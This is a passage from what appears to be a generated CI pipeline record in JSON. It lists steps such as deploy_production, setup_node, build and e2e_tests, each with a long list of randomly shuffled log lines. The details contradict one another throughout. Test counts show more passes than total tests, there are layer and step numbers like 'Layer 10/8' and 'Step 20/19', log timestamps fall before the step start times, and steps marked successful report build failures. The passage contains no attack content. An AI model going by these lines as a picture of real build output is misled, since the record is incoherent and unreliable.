          "[12:46:50] DEBUG: Memory usage: 1712MB",
          "Compiling utils/index.js...",
          "Minifying main.js",
          "Cache miss for key-3505",
          "Uploading artifact 'dist' (39 files)",
          "Exception: ValueError",
          "Compiling utils/service.java...",
          "Compiling utils/service.java...",
          "Verifying...",
          "Coverage: 96% statements, 69% branches",
          "Already up to date.",
          "[12:46:50] INFO: Connecting to database",
          "Waiting...",
          "Snapshots: 31 passed, 35 total",
          "WARNING: eslint has known vulnerabilities",
          "GET /health - 204 (81ms)",
          "pip: Downloading prettier-1.15.tar.gz",
          "\u2717 build failed with exit code 117",
          "Image pulled successfully",
          "POST /data - 202 (447ms)",
          "Tests: 228 passed, 71 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Fetching from https://googleapis.com/package.json",
          "Waiting...",
          "HEAD is now at 348497b",
          "Connection established",
          "Optimizing 61 modules...",
          "npm install: resolved 799 packages",
          "Finished.",
          "npm notice: package.json updated",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-04T12:48:00.633808",
        "finished_at": "2025-12-04T12:48:06.971345",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Pulling image: alpine:latest",
          "[12:46:50] ERROR: Connection failed",
          "Finished.",
          "Bundling styles.js",
          "Artifact uploaded: build.tar.gz (3MB)",
          "[12:46:50] DEBUG: Connection pool: 13 active",
          "NODE_ENV=test",
          "Fetching submodules...",
          "Step 18/24: Building",
          "  PASS: integration/test_user_create.spec.js",
          "Artifact downloaded: 3MB",
          "Step 1/18: Linting",
          "Checking out develop branch",
          "Using Node.js 16.13.7",
          "Pulling image: alpine:latest",
          "POST /upload - 201 (482ms)",
          "[12:46:50] INFO: Starting build process",
          "\u2713 deploy completed",
          "Ready.",
          "Cache restored successfully (127MB)",
          "HEAD is now at 739d88b",
          "Step 5/19: Building",
          "Fetching submodules...",
          "Time: 91.48s",
          "[12:46:50] WARN: Deprecated API usage",
          "[12:46:50] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "Waiting...",
          "Step 12/19: Deploying",
          "Compiling utils/app.ts...",
          "pip: Downloading express-5.3.tar.gz",
          "Transforming 670 files...",
          "[12:46:50] WARN: Deprecated API usage",
          "HEAD is now at 8e67d4b",
          "Compiling lib/utils.go...",
          "Pushing to registry...",
          "Ready.",
          "Artifact downloaded: 13MB",
          "pip: Collecting axios",
          "Cache invalidated: node_modules",
          "Generating source maps...",
          "[12:46:50] DEBUG: Memory usage: 1643MB",
          "Compiling components/service.java...",
          "Cache miss for key-3017",
          "Transforming 316 files...",
          "\u2713 Step 'checkout' succeeded",
          "  PASS: test_user_create (476ms)",
          "Layer 10/8: ENV command",
          "Pulling image: python:18",
          "npm install: resolved 1097 packages",
          "Artifact uploaded: dist.zip (37MB)",
          "\u2713 Step 'checkout' succeeded",
          "Artifact uploaded: build.tar.gz (11MB)",
          "[12:46:50] WARN: Deprecated API usage",
          "Step 16/19: Building",
          "\u2717 build failed with exit code 62",
          "Step 13/16: Testing",
          "  PASS: test_cache_hit (83ms)",
          "Cache miss for key-9564",
          "Minifying vendor.js",
          "Coverage: 89% statements, 76% branches",
          "Completed.",
          "Step 5/24: Linting",
          "Done.",
          "TLS handshake completed",
          "npm notice: created a lockfile",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Platform: darwin-arm64",
          "[12:46:50] INFO: Request completed",
          "Fetching from https://githubusercontent.com/package.json",
          "\u2713 All checks passed",
          "  PASS: integration/test_user_create.spec.js",
          "Step 1/15: Building",
          "Coverage: 77% statements, 90% branches",
          "Environment: test",
          "Bundling runtime.css",
          "Connection established",
          "WARNING: eslint has known vulnerabilities",
          "GET /health - 200 (54ms)",
          "Finished.",
          "Minifying main.js",
          "[12:46:50] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Waiting...",
          "pip: Collecting lodash",
          "Step 10/19: Building",
          "npm install: resolved 575 packages",
          "Compiling utils/index.js...",
          "  PASS: test_api_health (402ms)",
          "\u2713 All checks passed",
          "[12:46:50] INFO: Processing request",
          "NODE_ENV=test",
          "[12:46:50] INFO: Processing request",
          "Step 1/23: Installing dependencies",
          "Step 12/24: Running migrations",
          "OK",
          "Completed.",
          "npm notice: package.json updated",
          "[12:46:50] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "GET /status - 201 (69ms)",
          "[12:46:50] DEBUG: Memory usage: 1007MB",
          "Cache saved successfully",
          "Already up to date.",
          "Step 13/24: Installing dependencies",
          "Installing prettier@4.18.2",
          "Step 16/22: Installing dependencies",
          "Completed.",
          "[12:46:50] WARN: Deprecated API usage",
          "GET /health - 204 (91ms)",
          "Cache restored successfully (132MB)",
          "Uploading artifact 'coverage' (3 files)",
          "pip: Installing build dependencies...",
          "Step 16/20: Deploying",
          "POST /upload - 200 (182ms)",
          "Success!",
          "Building Docker image...",
          "\u2713 Step 'build' succeeded",
          "Done.",
          "Ran 107 tests in 35s",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "TLS handshake completed",
          "HEAD is now at 704c110",
          "[12:46:50] DEBUG: Loading configuration",
          "  PASS: unit/test_api_health.spec.js",
          "WARNING: lodash has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache miss for key-3010",
          "Step 9/24: Building",
          "npm notice: created a lockfile",
          "npm notice: created a lockfile",
          "Loading...",
          "[12:46:50] INFO: Cache refreshed",
          "Cache miss for key-2985",
          "npm notice: package.json updated",
          "Time: 49.615s",
          "POST /data - 201 (303ms)",
          "Ran 43 tests in 32s",
          "Cache restored successfully (67MB)",
          "npm install: added 15 packages",
          "Compiling src/index.js...",
          "Switched to branch 'hotfix/task-820'",
          "Installing axios@2.11.6",
          "\u2713 All checks passed",
          "Time: 96.133s",
          "Finished.",
          "Verifying...",
          "Success!",
          "TLS handshake completed",
          "WARNING: jest has known vulnerabilities",
          "npm install: resolved 1218 packages",
          "Ready.",
          "pip: Downloading prettier-5.18.tar.gz",
          "Loading...",
          "Step 2/21: Building",
          "Cache miss for key-7239",
          "WARNING: react has known vulnerabilities",
          "pip: Collecting react",
          "Artifact uploaded: build.tar.gz (2MB)",
          "GET /health - 200 (54ms)",
          "Compiling lib/main.py...",
          "  PASS: test_api_health (444ms)",
          "WARNING: prettier has known vulnerabilities",
          "Connection established",
          "Waiting...",
          "Pulling image: alpine:latest",
          "Platform: darwin-arm64",
          "Using Python 3.12",
          "Transforming 857 files...",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Minifying vendor.js",
          "TLS handshake completed",
          "Waiting...",
          "Artifact downloaded: 37MB",
          "FAILED: test_cache_hit",
          "[12:46:50] ERROR: Connection failed",
          "Processing...",
          "Exception: TypeError",
          "OK",
          "Step 5/20: Linting",
          "WARNING: axios has known vulnerabilities",
          "Exception: TypeError",
          "Fetching submodules...",
          "[12:46:50] INFO: Processing request",
          "Using Node.js 20.18.1",
          "Step 8/25: Running migrations",
          "  PASS: unit/test_auth_login.spec.js",
          "Platform: win32-x64",
          "Environment: staging",
          "yarn add: Done in 18.37s",
          "GET /api - 204 (47ms)",
          "WARNING: lodash has known vulnerabilities",
          "OK",
          "Ready.",
          "Snapshots: 3 passed, 49 total",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 3/25: Testing",
          "GET /health - 204 (47ms)",
          "Installing eslint@4.15.0",
          "Compiling lib/handler.rs...",
          "Exception: NullPointerException",
          "WARNING: axios has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Switched to branch 'hotfix/task-364'",
          "Success!",
          "Uploading artifact 'dist' (40 files)",
          "[12:46:50] INFO: Cache refreshed",
          "Cache invalidated: node_modules",
          "Minifying app.js",
          "[12:46:50] INFO: Cache refreshed",
          "Cache restored successfully (473MB)",
          "pip: Installing build dependencies...",
          "Using Python 3.9",
          "Bundling vendor.css",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-04T12:48:06.971345",
        "finished_at": "2025-12-04T12:48:22.815188",
        "log_lines": [
          "=== Step: setup_node ===",
          "[12:46:50] INFO: Connecting to database",
          "[12:46:50] INFO: Cache refreshed",
          "npm install: added 180 packages",
          "pip install: Successfully installed express-3.14",
          "Completed.",
          "Snapshots: 18 passed, 9 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Creating production build...",
          "Verifying...",
          "Using Node.js 20.15.0",
          "[12:46:50] INFO: Starting build process",
          "Cache invalidated: build",
          "Connection established",
          "Done.",
          "Artifact uploaded: dist.zip (38MB)",
          "npm notice: package.json updated",
          "WARNING: react has known vulnerabilities",
          "[12:46:50] WARN: Deprecated API usage",
          "Cache saved successfully",
          "Time: 69.530s",
          "Step 2/19: Running migrations",
          "Creating production build...",
          "Installing axios@4.3.9",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Connection established",
          "\u2713 Step 'checkout' succeeded",
          "npm notice: package.json updated",
          "Uploading artifact 'build' (2 files)",
          "[12:46:50] INFO: Processing request",
          "[12:46:50] WARN: Deprecated API usage",
          "Ran 169 tests in 43s",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Step 14/19: Installing dependencies",
          "Layer 10/8: RUN command",
          "\u2713 Step 'install' succeeded",
          "POST /data - 201 (287ms)",
          "Snapshots: 38 passed, 9 total",
          "Step 4/24: Building",
          "Finished.",
          "Connection established",
          "Layer 7/15: RUN command",
          "Compiling utils/service.java...",
          "Test Suites: 34 passed, 13 total",
          "TLS handshake completed",
          "Step 18/25: Testing",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Compiling lib/app.ts...",
          "GET /api - 200 (36ms)",
          "Using Node.js 17.5.10",
          "Verifying...",
          "Uploading artifact 'build' (40 files)",
          "[12:46:50] DEBUG: Query executed in 5ms",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Downloading eslint-1.13.tar.gz",
          "Using Python 3.10",
          "Pushing to registry...",
          "pip: Installing build dependencies...",
          "Using Python 3.11",
          "Cache restored successfully (170MB)",
          "  PASS: test_api_health (459ms)",
          "[12:46:50] INFO: Connecting to database",
          "Ready.",
          "[12:46:50] INFO: Processing request",
          "[12:46:50] INFO: Processing request",
          "Finished.",
          "Ready.",
          "Step 9/25: Building",
          "Snapshots: 20 passed, 7 total",
          "Using Node.js 16.19.7",
          "[12:46:50] ERROR: Connection failed",
          "npm install: added 224 packages",
          "Using Node.js 18.18.1",
          "Image pulled successfully",
          "Processing...",
          "Pushing to registry...",
          "\u2713 lint completed",
          "[12:46:50] DEBUG: Connection pool: 6 active",
          "Cache miss for key-8708",
          "Creating production build...",
          "Creating production build...",
          "Step 13/25: Deploying",
          "Connection established",
          "Cache invalidated: build",
          "NODE_ENV=test",
          "Checking out develop branch",
          "[12:46:50] DEBUG: Connection pool: 6 active",
          "Step 2/25: Building",
          "Step 18/24: Building",
          "npm notice: created a lockfile",
          "Compiling src/utils.go...",
          "[12:46:50] INFO: Connecting to database",
          "[12:46:50] DEBUG: Initializing service",
          "Already up to date.",
          "Compiling src/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:46:50] INFO: Processing request",
          "GET /health - 204 (71ms)",
          "Compiling lib/handler.rs...",
          "NODE_ENV=test",
          "[12:46:50] INFO: Cache refreshed",
          "npm notice: created a lockfile",
          "Verifying...",
          "[12:46:50] INFO: Starting build process",
          "WARNING: webpack has known vulnerabilities",
          "Fetching from https://pypi.org/package.json",
          "yarn add: Done in 29.28s",
          "Fetching submodules...",
          "Pulling image: node:18",
          "HEAD is now at 71e56ef",
          "Test Suites: 19 passed, 13 total",
          "\u2713 Step 'build' succeeded",
          "Connection established",
          "[12:46:50] DEBUG: Query executed in 83ms",
          "TLS handshake completed",
          "\u2713 All checks passed",
          "POST /api - 201 (33ms)",
          "GET /api - 201 (35ms)",
          "Completed.",
          "[12:46:50] INFO: Cache refreshed",
          "Cache saved successfully",
          "Processing...",
          "Using Python 3.11",
          "WARNING: axios has known vulnerabilities",
          "[12:46:51] INFO: Connecting to database",
          "Waiting...",
          "Cache saved successfully",
          "Bundling styles.js",
          "Cache hit for key-4944",
          "Platform: darwin-arm64",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Step 5/20: Testing",
          "yarn add: Done in 21.5s",
          "Coverage: 81% statements, 97% branches",
          "Success!",
          "pip: Collecting eslint",
          "NODE_ENV=test",
          "\u2713 All checks passed",
          "Minifying main.js",
          "Processing...",
          "Uploading artifact 'coverage' (36 files)",
          "[12:46:51] WARN: Deprecated API usage",
          "Compiling utils/handler.rs...",
          "\u2713 All checks passed",
          "Using Python 3.11",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: jest has known vulnerabilities",
          "Already up to date.",
          "Switched to branch 'hotfix/task-363'",
          "Uploading artifact 'coverage' (7 files)",
          "\u2713 Task completed in 2230ms",
          "[12:46:51] INFO: Starting build process",
          "  PASS: test_api_health (164ms)",
          "Ready.",
          "Pulling image: alpine:3.11",
          "Switched to branch 'hotfix/task-515'",
          "[12:46:51] INFO: Request completed",
          "WARNING: eslint has known vulnerabilities",
          "Using Python 3.11",
          "pip: Downloading react-4.14.tar.gz",
          "OK",
          "Step 16/17: Deploying",
          "npm install: resolved 483 packages",
          "Success!",
          "  PASS: integration/test_api_health.spec.js",
          "Layer 10/8: ENV command",
          "Already up to date.",
          "Switched to branch 'feature/task-915'",
          "Cache miss for key-4777",
          "Compiling components/service.java...",
          "Exception: RuntimeError",
          "Waiting...",
          "Time: 116.565s",
          "Cache invalidated: build",
          "\u2713 All checks passed",
          "HEAD is now at ba75be1",
          "Layer 3/11: RUN command",
          "WARNING: lodash has known vulnerabilities",
          "Using Python 3.10",
          "Environment: test",
          "TLS handshake completed",
          "Snapshots: 39 passed, 1 total",
          "Uploading artifact 'build' (22 files)",
          "Processing...",
          "[12:46:51] WARN: Deprecated API usage",
          "Compiling utils/handler.rs...",
          "[12:46:51] DEBUG: Query executed in 41ms",
          "Step 11/22: Installing dependencies",
          "Uploading artifact 'dist' (43 files)",
          "  PASS: unit/test_user_create.spec.js",
          "Finished.",
          "Finished.",
          "[12:46:51] INFO: Starting build process",
          "Optimizing 64 modules...",
          "Step 11/24: Running migrations",
          "pip install: Successfully installed express-2.7",
          "[12:46:51] DEBUG: Memory usage: 156MB",
          "\u2713 build completed",
          "[12:46:51] INFO: Connecting to database",
          "[12:46:51] INFO: Processing request",
          "Fetching submodules...",
          "Checking out master branch",
          "Snapshots: 23 passed, 12 total",
          "npm notice: created a lockfile",
          "Ready.",
          "Transforming 772 files...",
          "[12:46:51] INFO: Processing request",
          "Step 14/19: Testing",
          "Compiling src/main.py...",
          "Step 17/23: Running migrations",
          "Compiling utils/main.py...",
          "Already up to date.",
          "[12:46:51] DEBUG: Loading configuration",
          "Step 14/24: Building",
          "Verifying...",
          "OK",
          "\u2713 All checks passed",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-04T12:48:22.815188",
        "finished_at": "2025-12-04T12:49:10.346716",
        "log_lines": [
          "=== Step: build ===",
          "Pushing to registry...",
          "npm notice: package.json updated",
          "Switched to branch 'hotfix/task-302'",
          "Already up to date.",
          "[12:46:51] DEBUG: Loading configuration",
          "Fetching from https://githubusercontent.com/package.json",
          "Completed.",
          "yarn add: Done in 11.24s",
          "[12:46:51] INFO: Starting build process",
          "Done.",
          "Connection established",
          "Done.",
          "Step 6/25: Running migrations",
          "Building Docker image...",
          "Time: 12.436s",
          "Image pulled successfully",
          "Done.",
          "Transforming 834 files...",
          "Step 8/17: Running migrations",
          "Layer 4/9: ENV command",
          "WARNING: jest has known vulnerabilities",
          "npm install: added 408 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Done.",
          "Done.",
          "[12:46:51] INFO: Request completed",
          "WARNING: lodash has known vulnerabilities",
          "WARNING: jest has known vulnerabilities",
          "Ready.",
          "Creating production build...",
          "Checking out main branch",
          "npm install: resolved 848 packages",
          "[12:46:51] WARN: Deprecated API usage",
          "Pulling image: alpine:latest",
          "[12:46:51] INFO: Request completed",
          "[12:46:51] ERROR: Connection failed",
          "pip: Downloading react-1.9.tar.gz",
          "Pushing to registry...",
          "Using Node.js 17.14.3",
          "[12:46:51] INFO: Connecting to database",
          "Generating source maps...",
          "Step 13/15: Running migrations",
          "Step 9/20: Testing",
          "Pulling image: python:latest",
          "Bundling styles.css",
          "Tests: 295 passed, 402 total",
          "[12:46:51] ERROR: Connection failed",
          "Compiling src/index.js...",
          "Already up to date.",
          "Ready.",
          "Step 13/22: Installing dependencies",
          "[12:46:51] DEBUG: Loading configuration",
          "\u2713 Task completed in 1056ms",
          "  PASS: e2e/test_api_health.spec.js",
          "Pushing to registry...",
          "Snapshots: 33 passed, 27 total",
          "Step 11/16: Linting",
          "Building Docker image...",
          "Processing...",
          "Exception: RuntimeError",
          "\u2713 package completed",
          "Coverage: 80% statements, 74% branches",
          "Artifact downloaded: 31MB",
          "Generating source maps...",
          "Step 13/25: Linting",
          "GET /health - 201 (92ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Success!",
          "npm install: resolved 353 packages",
          "Transforming 947 files...",
          "pip: Downloading lodash-3.9.tar.gz",
          "Step 13/23: Testing",
          "[12:46:51] WARN: Deprecated API usage",
          "GET /api - 200 (8ms)",
          "[12:46:51] DEBUG: Query executed in 12ms",
          "Platform: win32-x64",
          "Already up to date.",
          "pip install: Successfully installed lodash-4.9",
          "Already up to date.",
          "Generating source maps...",
          "OK",
          "Compiling components/utils.go...",
          "FAILED: test_cache_hit",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Cache hit for key-5692",
          "GET /api - 204 (17ms)",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 All checks passed",
          "Ran 14 tests in 11s",
          "Test Suites: 27 passed, 47 total",
          "Connection established",
          "Compiling utils/utils.go...",
          "[12:46:51] INFO: Request completed",
          "Compiling src/handler.rs...",
          "Pushing to registry...",
          "Cache saved successfully",
          "NODE_ENV=development",
          "Image pulled successfully",
          "Cache hit for key-7331",
          "Pushing to registry...",
          "Processing...",
          "Creating production build...",
          "Artifact uploaded: dist.zip (18MB)",
          "Cache saved successfully",
          "Creating production build...",
          "HEAD is now at d1984fd",
          "\u2713 All checks passed",
          "Minifying vendor.js",
          "Step 10/19: Testing",
          "pip: Downloading react-3.3.tar.gz",
          "Done.",
          "Snapshots: 26 passed, 5 total",
          "\u2713 deploy completed",
          "\u2713 test completed",
          "Compiling utils/app.ts...",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Switched to branch 'hotfix/task-113'",
          "WARNING: express has known vulnerabilities",
          "Time: 108.693s",
          "npm install: resolved 326 packages",
          "Creating production build...",
          "POST /data - 201 (281ms)",
          "POST /upload - 201 (307ms)",
          "Artifact uploaded: dist.zip (66MB)",
          "Step 8/18: Installing dependencies",
          "Transforming 406 files...",
          "Completed.",
          "[12:46:51] WARN: Deprecated API usage",
          "Time: 39.945s",
          "Step 2/21: Testing",
          "[12:46:51] DEBUG: Memory usage: 1921MB",
          "NODE_ENV=production",
          "Fetching submodules...",
          "pip: Downloading lodash-5.9.tar.gz",
          "Generating source maps...",
          "[12:46:51] DEBUG: Initializing service",
          "POST /upload - 201 (329ms)",
          "Verifying...",
          "Cache restored successfully (400MB)",
          "Compiling components/app.ts...",
          "GET /api - 204 (73ms)",
          "Cache restored successfully (38MB)",
          "Environment: staging",
          "Exception: NullPointerException",
          "Step 11/17: Testing",
          "Transforming 767 files...",
          "[12:46:51] WARN: Deprecated API usage",
          "Step 10/18: Linting",
          "Cache hit for key-9582",
          "Waiting...",
          "Environment: staging",
          "Layer 10/12: COPY command",
          "  PASS: integration/test_db_connect.spec.js",
          "[12:46:51] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-5638",
          "[12:46:51] INFO: Connecting to database",
          "Step 13/15: Deploying",
          "TLS handshake completed",
          "Creating production build...",
          "Installing jest@2.9.9",
          "Layer 4/13: ENV command",
          "[12:46:51] ERROR: Connection failed",
          "[12:46:51] DEBUG: Query executed in 75ms",
          "Connection established",
          "[12:46:51] INFO: Cache refreshed",
          "[12:46:51] DEBUG: Connection pool: 13 active",
          "npm install: added 263 packages",
          "pip: Installing build dependencies...",
          "npm notice: created a lockfile",
          "Switched to branch 'hotfix/task-861'",
          "OK",
          "Step 13/16: Building",
          "Processing...",
          "[12:46:51] DEBUG: Loading configuration",
          "Waiting...",
          "Fetching from https://docker.io/package.json",
          "OK",
          "Cache saved successfully",
          "[12:46:51] DEBUG: Initializing service",
          "Cache restored successfully (489MB)",
          "[12:46:51] INFO: Starting build process",
          "Already up to date.",
          "Pushing to registry...",
          "Finished.",
          "\u2713 Task completed in 4407ms",
          "[12:46:51] INFO: Connecting to database",
          "pip: Collecting express",
          "Completed.",
          "pip: Collecting webpack",
          "Fetching from https://pypi.org/package.json",
          "Cache saved successfully",
          "[12:46:51] DEBUG: Initializing service",
          "  PASS: test_user_create (386ms)",
          "[12:46:51] WARN: Deprecated API usage",
          "Transforming 544 files...",
          "npm install: added 209 packages",
          "Ready.",
          "Fetching submodules...",
          "Building Docker image...",
          "Completed.",
          "npm notice: created a lockfile",
          "Compiling utils/app.ts...",
          "[12:46:51] INFO: Connecting to database",
          "Pushing to registry...",
          "Transforming 980 files...",
          "[12:46:51] DEBUG: Memory usage: 587MB",
          "Finished.",
          "Pulling image: python:18",
          "[12:46:51] INFO: Connecting to database",
          "yarn add: Done in 10.56s",
          "WARNING: axios has known vulnerabilities",
          "POST /data - 202 (72ms)",
          "\u2713 Task completed in 3533ms",
          "Already up to date.",
          "Environment: test",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-04T12:49:10.346716",
        "finished_at": "2025-12-04T12:49:26.190559",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Verifying...",
          "Layer 10/12: RUN command",
          "Platform: linux-x64",
          "[12:46:51] INFO: Processing request",
          "\u2713 All checks passed",
          "Exception: ValueError",
          "Pulling image: alpine:18",
          "\u2713 Step 'build' succeeded",
          "Ran 30 tests in 50s",
          "Platform: darwin-arm64",
          "[12:46:51] WARN: Deprecated API usage",
          "HEAD is now at d0c3e2d",
          "Pushing to registry...",
          "Generating source maps...",
          "[12:46:51] INFO: Starting build process",
          "POST /api - 202 (246ms)",
          "WARNING: lodash has known vulnerabilities",
          "Tests: 87 passed, 99 total",
          "yarn add: Done in 17.52s",
          "npm notice: package.json updated",
          "Tests: 451 passed, 352 total",
          "Minifying main.js",
          "[12:46:51] ERROR: Connection failed",
          "Fetching submodules...",
          "FAILED: test_cache_hit",
          "Coverage: 97% statements, 73% branches",
          "  PASS: unit/test_auth_login.spec.js",
          "POST /upload - 201 (485ms)",
          "Tests: 296 passed, 379 total",
          "Cache hit for key-1434",
          "[12:46:51] INFO: Connecting to database",
          "Layer 2/15: COPY command",
          "Image pulled successfully",
          "\u2713 Task completed in 2705ms",
          "WARNING: express has known vulnerabilities",
          "POST /api - 202 (418ms)",
          "Cache invalidated: build",
          "WARNING: axios has known vulnerabilities",
          "Loading...",
          "Test Suites: 43 passed, 16 total",
          "GET /status - 200 (24ms)",
          "Compiling components/app.ts...",
          "[12:46:51] INFO: Connecting to database",
          "FAILED: test_auth_login",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Cache saved successfully",
          "Fetching from https://npmjs.org/package.json",
          "NODE_ENV=test",
          "Verifying...",
          "Step 8/21: Installing dependencies",
          "npm install: added 394 packages",
          "WARNING: lodash has known vulnerabilities",
          "Ready.",
          "pip: Collecting prettier",
          "Installing eslint@2.13.2",
          "[12:46:51] INFO: Connecting to database",
          "npm notice: created a lockfile",
          "Fetching from https://github.com/package.json",
          "[12:46:51] INFO: Starting build process",
          "OK",
          "OK",
          "Transforming 543 files...",
          "WARNING: axios has known vulnerabilities",
          "Exception: TypeError",
          "npm install: added 363 packages",
          "Artifact downloaded: 26MB",
          "HEAD is now at 80ff9d8",
          "Step 20/19: Deploying",
          "NODE_ENV=production",
          "Creating production build...",
          "Minifying main.js",
          "Compiling components/index.js...",
          "WARNING: prettier has known vulnerabilities",
          "Fetching from https://docker.io/package.json",
          "npm install: added 439 packages",
          "Platform: linux-x64",
          "Checking out master branch",
          "Ran 40 tests in 20s",
          "Platform: win32-x64",
          "Installing eslint@2.14.9",
          "Uploading artifact 'build' (26 files)",
          "Fetching from https://googleapis.com/package.json",
          "Layer 8/13: COPY command",
          "Fetching from https://googleapis.com/package.json",
          "WARNING: eslint has known vulnerabilities",
          "Verifying...",
          "Success!",
          "Coverage: 72% statements, 79% branches",
          "Cache miss for key-3312",
          "Pushing to registry...",
          "[12:46:51] DEBUG: Memory usage: 832MB",
          "Time: 11.602s",
          "Already up to date.",
          "\u2713 All checks passed",
          "Step 9/21: Deploying",
          "Loading...",
          "Ready.",
          "HEAD is now at 642523d",
          "GET /health - 204 (93ms)",
          "Optimizing 36 modules...",
          "[12:46:51] WARN: Deprecated API usage",
          "WARNING: webpack has known vulnerabilities",
          "Compiling lib/index.js...",
          "GET /status - 200 (87ms)",
          "[12:46:51] INFO: Starting build process",
          "Processing...",
          "WARNING: jest has known vulnerabilities",
          "Ready.",
          "  PASS: integration/test_api_health.spec.js",
          "\u2713 lint completed",
          "pip: Installing build dependencies...",
          "Exception: RuntimeError",
          "Step 5/24: Deploying",
          "Checking out main branch",
          "Completed.",
          "\u2713 Task completed in 1909ms",
          "Cache restored successfully (368MB)",
          "\u2713 All checks passed",
          "  PASS: test_db_connect (144ms)",
          "Time: 113.760s",
          "Verifying...",
          "WARNING: lodash has known vulnerabilities",
          "Pushing to registry...",
          "pip: Collecting express",
          "Optimizing 73 modules...",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Minifying vendor.js",
          "[12:46:51] INFO: Starting build process",
          "Connection established",
          "[12:46:51] DEBUG: Connection pool: 20 active",
          "Uploading artifact 'build' (41 files)",
          "Test Suites: 43 passed, 43 total",
          "GET /health - 201 (87ms)",
          "Time: 91.339s",
          "Compiling utils/index.js...",
          "Minifying app.js",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Installing build dependencies...",
          "NODE_ENV=test",
          "FAILED: test_user_create",
          "[12:46:51] INFO: Cache refreshed",
          "GET /health - 204 (5ms)",
          "  PASS: test_db_connect (468ms)",
          "npm install: added 14 packages",
          "Cache hit for key-1705",
          "Waiting...",
          "Step 3/19: Running migrations",
          "HEAD is now at ab0fd51",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Time: 95.144s",
          "Building Docker image...",
          "Compiling components/main.py...",
          "[12:46:51] INFO: Request completed",
          "[12:46:51] WARN: Deprecated API usage",
          "  PASS: integration/test_user_create.spec.js",
          "Platform: linux-x64",
          "Snapshots: 31 passed, 34 total",
          "[12:46:51] DEBUG: Connection pool: 4 active",
          "Using Python 3.10",
          "npm install: resolved 543 packages",
          "Fetching from https://githubusercontent.com/package.json",
          "HEAD is now at bf1c530",
          "  PASS: test_db_connect (41ms)",
          "Step 9/15: Installing dependencies",
          "Checking out main branch",
          "[12:46:51] DEBUG: Query executed in 36ms",
          "Artifact downloaded: 7MB",
          "Waiting...",
          "\u2717 build failed with exit code 41",
          "[12:46:51] DEBUG: Query executed in 71ms",
          "  PASS: integration/test_cache_hit.spec.js",
          "Already up to date.",
          "npm notice: package.json updated",
          "Step 12/15: Testing",
          "NODE_ENV=production",
          "Success!",
          "Layer 4/9: RUN command",
          "Step 15/17: Installing dependencies",
          "WARNING: lodash has known vulnerabilities",
          "Installing axios@1.2.2",
          "npm notice: package.json updated",
          "OK",
          "Processing...",
          "Pushing to registry...",
          "Done.",
          "Fetching submodules...",
          "Cache hit for key-7187",
          "Pushing to registry...",
          "Step 12/16: Building",
          "Step 11/19: Installing dependencies",
          "Fetching submodules...",
          "Optimizing 26 modules...",
          "Ran 154 tests in 19s",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Cache restored successfully (45MB)",
          "[12:46:51] WARN: Deprecated API usage",
          "OK",
          "[12:46:51] INFO: Starting build process",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Success!",
          "Waiting...",
          "Installing react@2.1.1",
          "Step 16/21: Testing",
          "Uploading artifact 'dist' (7 files)",
          "Pulling image: python:latest",
          "Generating source maps...",
          "[12:46:51] WARN: Deprecated API usage",
          "Compiling components/index.js...",
          "[12:46:51] INFO: Processing request",
          "[12:46:51] INFO: Processing request",
          "npm notice: created a lockfile",
          "Tests: 409 passed, 457 total",
          "Cache saved successfully",
          "npm install: resolved 1510 packages",
          "Optimizing 32 modules...",
          "[12:46:51] ERROR: Connection failed",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-04T12:49:26.190559",
        "finished_at": "2025-12-04T12:49:35.696865",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Success!",
          "Verifying...",
          "[12:46:51] INFO: Cache refreshed",
          "Processing...",
          "GET /health - 201 (98ms)",
          "[12:46:51] INFO: Cache refreshed",
          "Environment: development",
          "Coverage: 97% statements, 85% branches",
          "Switched to branch 'hotfix/task-781'",
          "Building Docker image...",
          "Completed.",
          "Compiling lib/index.js...",
          "Cache hit for key-5354",
          "[12:46:51] WARN: Deprecated API usage",
          "Image pulled successfully",
